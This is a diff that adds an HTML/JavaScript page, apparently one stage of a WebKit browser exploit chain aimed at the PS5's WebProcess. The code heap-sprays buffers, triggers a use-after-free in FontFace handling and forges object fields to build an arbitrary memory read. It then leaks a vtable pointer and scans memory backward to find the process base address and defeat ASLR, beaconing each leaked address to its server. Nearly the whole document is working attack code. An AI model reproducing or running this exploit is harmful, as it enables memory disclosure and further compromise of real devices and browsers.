@@ -1,0 +1,575 @@
+<!--
+  p710: base-discovery — scan backward from code segment to find WebProcess base
+
+  Reuses p691 walk chain to get VP and s2 (lowest known code address),
+  then scans backward in 4MB coarse steps (then 16KB binary search) to find
+  the ELF magic 7F454C46 that marks the WebProcess text base.
+
+  Server-side state (/p710state) survives WebProcess crashes.
+  Final result: RVA = VP - base.
+
+  Scan algorithm:
+    Phase 1 (coarse): from loCode (s2), step backward 4MB per read.
+      First read is at loCode itself (must be readable — it's a code fn).
+      Each read: ARM beacon → forgeRead(addr,16) → readStyle → ALIVE beacon.
+      If read crashes → server records death address; next load resumes.
+    Phase 2 (fine): binary search between lastOk and lastCrash, step 16KB.
+    Phase 3: scan first few pages at the boundary for ELF header.
+
+  CRASH_CLASS: HIGH
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p710 base-discovery</title></head>
+<body>
+<div id="verdict" style="position:sticky;top:0;z-index:9;font:700 15px monospace;padding:.5rem;background:#fff4d6;color:#5a4300;border-bottom:2px solid #d7b34a">RUNNING</div>
+<pre id="out">p710</pre>
+<script>
+'use strict';
+var SKIPJ=-1;
+var O=document.getElementById('out');
+var UID=Math.random().toString(36).slice(2,8).toUpperCase();
+
+/* --- beacon infrastructure --- */
+function b(m){try{O.textContent+='\n'+m;}catch(e){}
+  try{var u=location.protocol+'//'+location.host+'/beacon/P710-'+encodeURIComponent(m)+'?t='+Date.now()+'&u='+UID;if(navigator.sendBeacon&&navigator.sendBeacon(u))return;}catch(e){}
+  try{new Image().src=location.protocol+'//'+location.host+'/beacon/P710-'+encodeURIComponent(m)+'?t='+Date.now();}catch(e){}}
+function bs(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/P710-'+encodeURIComponent(m)+'?t='+Date.now()+'&u='+UID,false);x.send(null);}catch(e){try{b(m+'-XLOST');}catch(e2){}}}
+function verd(k,t){var v=document.getElementById('verdict');v.style.background=(k==='ok')?'#e3f5e6':'#fde2e1';v.style.color=(k==='ok')?'#0f5a20':'#8c1010';v.innerHTML=t;
+  if(k!=='ok'){setTimeout(function(){location.reload();},8000);}}
+
+/* --- server state helpers --- */
+function getState(){
+  try{var x=new XMLHttpRequest();x.open('GET','/p710state',false);x.send(null);
+    if(x.status===200)return JSON.parse(x.responseText);
+  }catch(e){}
+  return null;
+}
+/* state is communicated entirely via beacons: P710-VP-, P710-ARM-, P710-ALIVE, etc. */
+
+/* --- query params --- */
+function qint(n,d){var m=new RegExp('[?&]'+n+'=([^&]*)').exec(location.search);return m?parseInt(m[1],10):d;}
+var K=qint('k',32), PW=qint('pw',80), DL=qint('dl',0);
+var SI=qint('si',0);
+var CTL=qint('ctl',0);
+var COARSE_STEP=qint('step',0x400000);
+var FINE_STEP=0x4000;
+var MAX_SCAN=qint('maxscan',512);
+
+var SIZE=192, fired=false, faces=null;
+
+/* --- primitives --- */
+function le(v,o){var x=0n;for(var k=7;k>=0;k--)x=(x<<8n)|BigInt(v[o+k]);return x;}
+function put64(u,o,x){for(var k=0;k<8;k++){u[o+k]=Number((x>>BigInt(8*k))&0xFFn);}}
+function put32(u,o,x){u[o]=x&0xFF;u[o+1]=(x>>>8)&0xFF;u[o+2]=(x>>>16)&0xFF;u[o+3]=(x>>>24)&0xFF;}
+function hex(x){return '0x'+x.toString(16);}
+
+/* --- check if already done on load --- */
+var initState=getState();
+if(initState&&initState.done){
+  b('ALREADY-DONE');
+  b('BASE='+initState.base);
+  b('VP='+initState.vp);
+  b('RVA='+(initState.rva||'?'));
+  verd('ok','DONE: base='+initState.base+'<br>VP='+initState.vp+'<br>RVA='+initState.rva);
+}
+
+/* --- spray + UAF trigger (from p691) --- */
+function start(){
+  if(initState&&initState.done){return;}
+
+  var vf;try{vf=new FontFace('vf','local(Helvetica)',{unicodeRange:'U+0041'});}catch(e){b('NOVF');return;}
+  try{document.fonts.add(vf);}catch(e){}
+  try{void vf.loaded;}catch(e){}
+  var fs=document.createElement('style');
+  fs.textContent='@font-face{font-family:v1;src:local(Arial);unicode-range:U+0042;}';
+  document.head.appendChild(fs);
+
+  Object.defineProperty(FontFace.prototype,'then',{configurable:true,get:function(){
+    if(fired)return undefined;fired=true;
+    if(!CTL){try{fs.remove();}catch(e){}try{document.fonts.delete(this);}catch(e){}}
+    try{document.body.offsetHeight;}catch(e){}
+    window.__sp=[];
+    for(var k=0;k<K;k++){
+      var w=new Uint8Array(new ArrayBuffer(SIZE));
+      w[0x82]=3;
+      w[0]=0;w[1]=0;w[2]=0;w[3]=0x80;
+      var mj=0x1000+k;w[4]=mj&0xFF;w[5]=(mj>>8)&0xFF;w[6]=0;w[7]=0;
+      window.__sp.push(w);
+    }
+    return undefined;
+  },set:function(){}});
+
+  document.fonts.load('1em vf, v1','AB').then(function(f){faces=f;b('RES-n'+f.length);setTimeout(phase,PW);},
+                                               function(e){b('RJ-'+String(e&&e.name));});
+  setTimeout(function(){if(!faces)b('NOFACES');},1500);
+}
+
+/* --- main analysis chain --- */
+function phase(){
+  var bufs=[],bufl1=[],L1=0n,L2=0n,rawL=null;
+
+  /* Step 1: hit detection + leak L1/L2 */
+  for(var i=0;i<window.__sp.length;i++){
+    var a=le(window.__sp[i],0x58),c=le(window.__sp[i],0x68);
+    if(a>0x1000000000n){bufs.push([window.__sp[i],c]);bufl1.push(a);if(!rawL)rawL=[a,c];}
+  }
+  if(rawL){L1=rawL[0];L2=rawL[1];}
+  b('L1-'+hex(L1));b('L2-'+hex(L2));
+  if(!bufs.length||L2===0n){b('NOLEAK');verd('bad','NOLEAK');return;}
+
+  /* Step 2: initial forge */
+  for(var ib=0;ib<bufs.length;ib++){var vb=bufs[ib][0];vb[0]=2;put64(vb,0x08,bufs[ib][1]);vb[0x10]=0;vb[0x82]=0;}
+  b('FORGED-'+bufs.length);
+
+  /* Step 3: re-add faces, find oracle face */
+  setTimeout(function(){
+    for(var i2=0;i2<faces.length;i2++){try{faces[i2].family='zz'+i2;}catch(e){}}
+    b('FAMILY-OK');
+    setTimeout(function(){
+      for(var i3=0;i3<faces.length;i3++){try{document.fonts.add(faces[i3]);}catch(e){}}
+      b('ADD-OK');
+      setTimeout(function(){
+        var fam=null,zi=-1;
+        for(var q=0;q<faces.length;q++){var r=null;try{r=document.fonts.check('1em zz'+q,'A');}catch(e){}if(r===false){fam='zz'+q;zi=q;window.__zi=q;break;}}
+        b('INTABLE-'+fam);
+        if(!fam){b('NOTIN');verd('bad','NOTIN');return;}
+
+        for(var is2=0;is2<bufs.length;is2++){bufs[is2][0][0x28]=1;bufs[is2][0][0x2C]=1;}
+
+        /* --- oracle functions --- */
+        var self=0n,selfFound=false;
+
+        function setR(t){for(var ir=0;ir<bufs.length;ir++){if(SKIPJ>=0&&bufs[ir][0]===window.__sp[SKIPJ])continue;put64(bufs[ir][0],0x20,t);}}
+        function chk(c){try{return document.fonts.check('1em '+fam,String.fromCodePoint(c))===false;}catch(e){return null;}}
+        function boundary(tgt){
+          setR(tgt);
+          if(chk(0)!==true)return -1;
+          var lo=0,hi=0x10FFFF,res=-1;
+          while(lo<=hi){var mid=(lo+hi)>>1;var r=chk(mid);if(r===null)break;if(r===true){res=mid;lo=mid+1;}else hi=mid-1;}
+          return res;
+        }
+
+        /* --- style-read mechanism (from p691) --- */
+        function forgeRead(daddr,dlen){
+          for(var ib2=0;ib2<window.__sp.length;ib2++){
+            var vb2=window.__sp[ib2];if(!vb2)continue;
+            if(SKIPJ>=0&&ib2===SKIPJ)continue;
+            if(selfFound){put64(vb2,0x08,self+0x70n);vb2[0x10]=0;}
+            put32(vb2,0x30,4);put32(vb2,0x34,dlen);put64(vb2,0x38,daddr);put32(vb2,0x40,4);
+            vb2[0x44]=0x7A;vb2[0x45]=0x7A;vb2[0x46]=0x71;
+            put32(vb2,0x70,4);
+            put32(vb2,0x74,0x10);vb2[0x78]=14;vb2[0x79]=0;
+            if(selfFound)put64(vb2,0x7A,self+0x90n);
+            put32(vb2,0x90,3);put32(vb2,0x94,72);
+            if(selfFound)put64(vb2,0x98,self+0x30n);
+          }
+        }
+        function dec(s,lim){
+          var by=[],q2=(s.charAt(0)==='"')?1:0,e=(s.slice(-1)==='"')?s.length-1:s.length,k=q2;
+          while(k<e&&by.length<lim){var ch=s.charAt(k);
+            if(ch==='\\'){k++;var hh='';while(k<e&&hh.length<6&&/[0-9a-fA-F]/.test(s.charAt(k))){hh+=s.charAt(k);k++;}
+              if(hh.length===0){if(k<e){by.push(s.charCodeAt(k));k++;}}
+              else{if(s.charAt(k)===' ')k++;var cp=parseInt(hh,16);if(cp>255)cp&=0xFF;by.push(cp);}}
+            else{by.push(s.charCodeAt(k));k++;}}
+          var h='';for(var j=0;j<by.length;j++)h+=('0'+by[j].toString(16)).slice(-2);return h;
+        }
+        function readStyle(){
+          if(zi<0)return '';
+          try{return dec(String(faces[zi].style),128);}catch(e){return 'THROW';}
+        }
+        function readLeHex(hexStr,off){
+          var s=hexStr.slice(off*2,off*2+16);
+          if(!/^[0-9a-f]{16}$/.test(s))return 0n;
+          return BigInt('0x'+s.match(/../g).reverse().join(''));
+        }
+        function restoreAll(snap){
+          for(var ib3=0;ib3<window.__sp.length;ib3++){
+            var vb3=window.__sp[ib3];if(!vb3)continue;
+            if(SKIPJ>=0&&ib3===SKIPJ)continue;
+            for(var dd2=0;dd2<SIZE;dd2++)vb3[dd2]=snap[dd2];
+          }
+        }
+        function restoreAndForge(snap,daddr,dlen){
+          restoreAll(snap);
+          forgeRead(daddr,dlen);
+        }
+
+        /* --- Step 4: oracle validation (simplified — skip PH2/PH3 client scan) --- */
+        var t1=-1,l2i=-1;
+        b('DIAG-bufs='+bufs.length+',fam='+fam+',zi='+zi);
+        for(var q8=0;q8<bufs.length;q8++){
+          L1=bufl1[q8];L2=bufs[q8][1];
+          setR(L2+0x07n);
+          t1=boundary(L2+0x07n);
+          if(t1>=0){l2i=q8;break;}
+        }
+        if(l2i<0){L1=bufl1[0];L2=bufs[0][1];}
+
+        var oracleAlive=(t1>=0);
+        if(!oracleAlive){
+          b('A-DEAD');
+          for(var ipd=0;ipd<bufs.length;ipd++){var vpd=bufs[ipd][0];
+            vpd[0x38]=0x00;vpd[0x39]=0x10;vpd[0x3A]=0x00;vpd[0x3B]=0x00;
+            vpd[0x3C]=0x00;vpd[0x3D]=0x20;vpd[0x3E]=0x00;vpd[0x3F]=0x00;}
+        }
+
+        /* --- Step 5: Phase 3 — Self scan (from p691, simplified) --- */
+        if(!selfFound){
+          var b2Ref=Number((L2>>16n)&0xFFn);
+          var b4Ref=Number((L2>>32n)&0xFFn);
+          var B4s=[b4Ref];
+          var b4all=[0x10,0x08];
+          for(var q8b=0x09;q8b<=0x0F;q8b++)b4all.push(q8b);
+          for(var q9=0x11;q9<=0x1F;q9++)b4all.push(q9);
+          for(var qw=0;qw<b4all.length;qw++){if(b4all[qw]!==b4Ref)B4s.push(b4all[qw]);}
+
+          var b2s=[];for(var q5=0;q5<256;q5++)b2s.push(q5);
+          b2s.sort(function(x,y){return Math.abs(x-b2Ref)-Math.abs(y-b2Ref);});
+          var b0a=[];for(var q6=0;q6<16;q6++)b0a.push(q6*16);
+
+          var n3=0;
+          b('PH3-START-b4='+B4s[0]);
+
+          for(var i8=0;i8<B4s.length&&!selfFound;i8++){
+            for(var i7=0;i7<b2s.length&&!selfFound;i7++){
+              for(var q7=0;q7<0x7F&&!selfFound;q7++){
+                for(var i6=0;i6<b0a.length&&!selfFound;i6++){
+                  var sc=BigInt(b0a[i6])|(BigInt(q7)<<8n)|(BigInt(b2s[i7])<<16n)|(BigInt(B4s[i8])<<32n);
+                  setR(sc+0x38n);n3++;
+                  if(chk(0x1000)===true&&chk(0xFFF)===false&&chk(0x2000)===true&&chk(0x2001)===false){
+                    self=sc;selfFound=true;
+                  }
+                  if((n3%512)===0)b('PH3-'+n3);
+                }
+              }
+            }
+          }
+        }
+
+        if(!selfFound){b('NOSELF');verd('bad','NOSELF');return;}
+        b('SELF-0x'+self.toString(16));
+
+        /* --- Step 6: VTAB search (from p691) --- */
+        var VTAB=0n;
+        for(var sv=1;sv<=256&&VTAB===0n;sv++){
+          var cd=self-BigInt(sv*64);
+          setR(cd);
+          if(chk(0x1000)===true&&chk(0x1001)===false){
+            var jj=Number(boundary(cd))-0x1000;
+            if(jj>=0&&jj<K){VTAB=cd;SKIPJ=jj;b('VTAB-0x'+cd.toString(16)+'-j'+jj);break;}
+          }
+        }
+        if(VTAB===0n){
+          for(var sv2=1;sv2<=256&&VTAB===0n;sv2++){
+            var cu=self+BigInt(sv2*64);
+            setR(cu);
+            if(chk(0x1000)===true&&chk(0x1001)===false){
+              var jj2=Number(boundary(cu))-0x1000;
+              if(jj2>=0&&jj2<K){VTAB=cu;SKIPJ=jj2;b('VTAB-0x'+cu.toString(16)+'-j'+jj2);break;}
+            }
+          }
+        }
+        if(VTAB===0n)b('VTAB-NONE');
+
+        /* --- Step 7: Remove ALL faces from set before forgeRead ---
+           Non-oracle faces in document.fonts get accessed by CSS layout
+           during sync XHR event-loop pumps, crashing on the UAF buffer.
+           Delete everything — face.style still works after deletion. */
+        bs('DEL-PRE-FORGE');
+        for(var id=0;id<faces.length;id++){try{document.fonts.delete(faces[id]);}catch(e){}}
+        bs('DEL-OK');
+
+        /* --- Step 8: Immediate hash table read --- */
+        var cachedHT='';
+        var preSnap=new Uint8Array(SIZE);
+        if(bufs.length>0)for(var ps0=0;ps0<SIZE;ps0++)preSnap[ps0]=bufs[0][0][ps0];
+        forgeRead(L1-0x10n,80);
+        try{cachedHT=dec(String(faces[zi].style),128);bs('IHT-ok-'+cachedHT.length);}catch(e){bs('IHT-err');}
+        for(var pr0=0;pr0<window.__sp.length;pr0++){var prv=window.__sp[pr0];if(!prv)continue;if(SKIPJ>=0&&pr0===SKIPJ)continue;for(var pr1=0;pr1<SIZE;pr1++)prv[pr1]=preSnap[pr1];}
+
+        /* --- Step 9: SYNCHRONOUS walk chain (from p691) --- */
+        var snap2=preSnap;
+        var hw='',h2='',h3='',h4='';
+        var IM=0n,FO=0n,VP=0n;
+        var S0=0n,S1=0n,S2=0n,S3=0n,Q4=0n,R5=0n,R6=0n,R7=0n,S8=0n;
+        var walkOK=false;
+
+        if(cachedHT.length>=160){
+          hw=cachedHT;
+
+          /* W1: parse hash table buckets */
+          var seen=0;
+          for(var gb=2;gb<10;gb++){
+            var hb=hw.slice(gb*16,gb*16+16);
+            if(/^[0-9a-f]{16}$/.test(hb)){
+              var cv=BigInt('0x'+hb.match(/../g).reverse().join(''));
+              if(cv>0x1000000000n&&cv<0xFFFFFFFFFFFFFFFFn){if(seen===SI){IM=cv;break;}seen++;}
+            }
+          }
+
+          if(IM!==0n){
+            /* W2: WeakPtrImpl+8 → CSSFontFaceSet* */
+            restoreAndForge(snap2,IM+8n,16);
+            h2=readStyle();
+            var hf=h2.slice(0,16);
+            if(/^[0-9a-f]{16}$/.test(hf)){
+              FO=BigInt('0x'+hf.match(/../g).reverse().join(''));
+            }
+
+            if(FO>0x1000000000n){
+              /* W3: client object → vtable pointer + back-pointers */
+              restoreAndForge(snap2,FO,32);
+              h3=readStyle();
+              var hv=h3.slice(0,16),hz=h3.slice(32,48);
+              if(/^[0-9a-f]{16}$/.test(hv)){
+                VP=BigInt('0x'+hv.match(/../g).reverse().join(''));
+              }
+              if(/^[0-9a-f]{16}$/.test(hz)){
+                var bk=BigInt('0x'+hz.match(/../g).reverse().join(''));
+                if(bk>0x1000000000n&&bk<0x10000000000n)self=bk;
+              }
+
+              if(VP>0x100000000n){
+                /* YIELD: restore safe state */
+                restoreAll(snap2);
+                bs('W3-MID');
+
+                /* W4: ALL vtable slots 0-8, 72B */
+                restoreAndForge(snap2,VP,72);
+                h4=dec(String(faces[zi].style),128);
+
+                if(h4.length>=128){
+                  S0=readLeHex(h4,0);S1=readLeHex(h4,8);S2=readLeHex(h4,16);
+                  S3=readLeHex(h4,24);Q4=readLeHex(h4,32);R5=readLeHex(h4,40);
+                  R6=readLeHex(h4,48);R7=readLeHex(h4,56);S8=readLeHex(h4,64);
+                  walkOK=true;
+                }
+              }
+            }
+          }
+        }
+
+        /* Restore all buffers to safe state */
+        restoreAll(snap2);
+
+        /* === NOW safe to beacon === */
+        bs('WALK-IM='+hex(IM)+',FO='+hex(FO)+',VP='+hex(VP));
+        bs('WALK-ok='+walkOK);
+        if(VP>0n){
+          bs('VT-s0='+hex(S0)+',s1='+hex(S1)+',s2='+hex(S2));
+          bs('VT-s3='+hex(S3)+',s4='+hex(Q4)+',s5='+hex(R5));
+          bs('VT-s6='+hex(R6)+',s7='+hex(R7)+',s8='+hex(S8));
+        }
+
+        if(!walkOK){
+          bs('WALK-FAIL');
+          verd('bad','WALK FAIL IM='+hex(IM)+' FO='+hex(FO)+' VP='+hex(VP));
+          return;
+        }
+
+        /* ================================================================
+           SCAN PHASE: find WebProcess base by scanning backward from s2
+           ================================================================ */
+
+        /* Use VP as scan start — VP is in .rodata (readable).
+           Vtable FUNCTION pointers (S0-S7) are in .text which is XO
+           (execute-only) on PS5 — reading them crashes. Scan backward
+           from VP through readable .rodata to find its lower boundary. */
+        var loCode=VP;
+        bs('SCAN-loCode='+hex(loCode));
+
+        /* Save walk results to server; VP is the stable reference for delta math */
+        bs('VP-VP='+hex(VP)+',s2='+hex(S2));
+
+        /* Read current server state to see where we left off.
+           ASLR changes on every WebProcess crash/restart, so addresses from
+           previous runs are INVALID.  The server stores VP-relative DELTAS:
+             okDelta   = oldVP - lastOkAddr   (positive = below VP)
+             crashDelta = oldVP - crashAddr
+           These are constant across boots because all code moves together.
+           We translate back: lastOk = VP - okDelta, etc. */
+        var st=getState();
+        if(st&&st.done){
+          var savedRVA=st.rva||'?';
+          bs('SCAN-ALREADY-DONE-rva='+savedRVA);
+          verd('ok','DONE: RVA='+savedRVA+'<br>VP='+hex(VP));
+          return;
+        }
+
+        var scanPhase=(st&&st.phase&&st.phase!=='idle')?st.phase:'coarse';
+        var lastOk=0n;
+        var lastCrash=0n;
+
+        /* Translate stored deltas to current-boot addresses */
+        if(st&&st.okDelta){
+          var od=BigInt(st.okDelta);
+          if(od>0n)lastOk=VP-od;
+        }
+        if(st&&st.crashDelta){
+          var cd=BigInt(st.crashDelta);
+          if(cd>0n)lastCrash=VP-cd;
+        }
+
+        /* Death detection: if server says the previous armed address died,
+           translate that delta to a crash address in the current boot */
+        if(st&&st.died&&st.deadArm){
+          var deadDelta=0n;
+          if(st.armDelta){
+            deadDelta=BigInt(st.armDelta);
+          } else if(st.deadArm!=='0x0'&&st.vp){
+            /* Fallback: compute delta from stored VP and deadArm */
+            deadDelta=BigInt(st.vp)-BigInt(st.deadArm);
+          }
+          if(deadDelta>0n){
+            var deadAddr=VP-deadDelta;
+            bs('SCAN-DIED-AT-delta='+hex(deadDelta)+',addr='+hex(deadAddr));
+
+            if(scanPhase==='coarse'){
+              lastCrash=deadAddr;
+              if(lastOk===0n)lastOk=deadAddr+BigInt(COARSE_STEP);
+              if(lastOk-lastCrash<=BigInt(FINE_STEP)){
+                scanPhase='header';
+              } else {
+                scanPhase='fine';
+              }
+            } else if(scanPhase==='fine'){
+              lastCrash=deadAddr;
+              if(lastOk-lastCrash<=BigInt(FINE_STEP)){
+                scanPhase='header';
+              }
+            }
+          }
+          bs('PHASE-'+scanPhase);
+        }
+
+        bs('SCAN-phase='+scanPhase+',lastOk='+hex(lastOk)+',lastCrash='+hex(lastCrash));
+
+        /* Helper: save VP-relative deltas to server */
+        function saveDelta(okA,crA){
+          if(okA>0n)bs('OKDELTA-'+hex(VP-okA));
+          if(crA>0n)bs('CRASHDELTA-'+hex(VP-crA));
+        }
+
+        var scanIdx=0;
+
+        function doScan(){
+          /* Synchronous loop — NO event loop gaps (setTimeout causes CSS
+             engine to touch UAF buffer and crash between reads). */
+          for(;;){
+          var addr=0n;
+
+          if(scanPhase==='coarse'){
+            var step=BigInt(COARSE_STEP);
+            if(lastOk>0n){
+              addr=lastOk-step;
+            } else {
+              addr=loCode&~0x3FFFn;
+            }
+          } else if(scanPhase==='fine'){
+            var mid=(lastOk+lastCrash)/2n;
+            addr=mid&~0x3FFFn;
+          } else if(scanPhase==='header'){
+            /* Boundary found: report measurements and done */
+            var rodataOff=VP-lastOk;
+            var textMin=lastOk-S2;
+            bs('BOUNDARY-rodata='+hex(lastOk));
+            bs('BOUNDARY-text-top='+hex(lastCrash));
+            bs('BOUNDARY-VP-offset='+hex(rodataOff));
+            bs('BOUNDARY-text-min-size='+hex(textMin));
+            bs('BOUNDARY-s2-below='+hex(lastOk-S2));
+            bs('PHASE-done');
+            bs('SCAN-RESULT-boundary='+hex(lastOk)+',VP='+hex(VP)+',s2='+hex(S2)+',rodata_off='+hex(rodataOff));
+            verd('ok','BOUNDARY='+hex(lastOk)+'<br>VP='+hex(VP)+'<br>.rodata offset='+hex(rodataOff)+'<br>.text min='+hex(textMin)+'<br>ELF header unreachable (XO .text)');
+            return;
+          }
+
+          if(addr<=0x100000000n||addr>0x10000000000n){
+            bs('SCAN-OUT-OF-RANGE-'+hex(addr));
+            verd('bad','SCAN OUT OF RANGE '+hex(addr));
+            return;
+          }
+
+          /* ARM: tell server; also send the VP-delta so death detection works across boots */
+          bs('ARM-addr='+hex(addr));
+          bs('ARMDELTA-'+hex(VP-addr));
+          bs('PHASE-'+scanPhase);
+
+          /* Perform the read — this may crash WebProcess */
+          restoreAndForge(snap2,addr,16);
+          var rd='';
+          try{rd=readStyle();}catch(e){rd='THROW';}
+          restoreAll(snap2);
+
+          bs('ALIVE');
+
+          var readable=(rd!=='THROW'&&rd.length>=2);
+          var isElf=readable&&(rd.length>=8&&rd.slice(0,8)==='7f454c46');
+
+          if(readable)bs('READ-addr='+hex(addr)+',data='+rd.slice(0,32));
+          else bs('READ-EMPTY-'+hex(addr));
+
+          /* === Check for ELF magic in ANY phase === */
+          if(isElf){
+            var rva=VP-addr;
+            bs('BASE-'+hex(addr));
+            bs('PHASE-done');
+            bs('RVA-'+hex(rva));
+            verd('ok','BASE='+hex(addr)+'<br>VP='+hex(VP)+'<br>RVA='+hex(rva));
+            return;
+          }
+
+          /* === Phase-specific progression === */
+          if(scanPhase==='coarse'){
+            if(readable){
+              lastOk=addr;
+              saveDelta(lastOk,lastCrash);
+            } else {
+              lastCrash=addr;
+              if(lastOk===0n)lastOk=addr+BigInt(COARSE_STEP);
+              saveDelta(lastOk,lastCrash);
+              if(lastOk-lastCrash<=BigInt(FINE_STEP)){
+                scanPhase='header';scanIdx=0;
+                bs('PHASE-header');
+              } else {
+                scanPhase='fine';
+                bs('PHASE-fine');
+              }
+              bs('COARSE-BOUNDARY-ok='+hex(lastOk)+',crash='+hex(lastCrash)+',next='+scanPhase);
+            }
+          } else if(scanPhase==='fine'){
+            if(readable){lastOk=addr;}else{lastCrash=addr;}
+            saveDelta(lastOk,lastCrash);
+            if(lastOk-lastCrash<=BigInt(FINE_STEP)){
+              scanPhase='header';scanIdx=0;
+              bs('PHASE-header');
+              bs('FINE-CONVERGED-ok='+hex(lastOk));
+            }
+          }
+
+          /* Continue loop */
+          scanIdx++;
+          if(scanIdx>=MAX_SCAN){
+            bs('SCAN-MAX-REACHED-'+scanPhase);
+            verd('bad','MAX SCAN ('+MAX_SCAN+') lastOk='+hex(lastOk));
+            return;
+          }
+          } /* end for(;;) */
+        }
+
+        /* Start the scan — set phase on server BEFORE any crash-prone read.
+           NO verd() here — innerHTML triggers layout which can touch the
+           UAF buffer via font faces still in document.fonts. */
+        bs('SCAN-START-from='+hex(loCode));
+        bs('PHASE-'+scanPhase);
+
+        /* First scan read is SYNCHRONOUS — no event loop gap for CSS/GC */
+        doScan();
+
+      },60); /* post ADD-OK */
+    },40); /* post FAMILY-OK */
+  },60); /* post FORGED */
+}
+
+if(document.readyState==='complete'||document.readyState==='interactive')
+  setTimeout(function(){if(!(initState&&initState.done))setTimeout(start,DL);},0);
+else document.addEventListener('DOMContentLoaded',function(){if(!(initState&&initState.done))setTimeout(start,DL);});
+</script></body></html>
